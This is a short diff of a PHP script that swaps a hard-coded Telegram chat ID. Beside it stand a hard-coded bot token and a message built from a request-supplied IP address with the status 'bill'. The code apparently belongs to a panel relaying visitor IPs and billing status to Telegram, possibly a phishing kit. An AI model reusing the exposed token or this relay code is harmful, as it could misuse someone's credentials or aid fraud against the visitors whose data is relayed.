@@ -4,7 +4,7 @@ if(isset($_SESSION["username"])) {
 
 if(isset($_GET['messageId'])){
 $botToken = "6887294087:AAEC802yB2ffTk_d0HaC43X6tv3VTnaHTOs";
-$chatID = "1064643518";
+$chatID = "-4141629905";
 	$messageId=$_GET['messageId'];
 	$ipzebi=$_GET['ipzebi'];
 	$message ="IP: $ipzebi , status : bill";
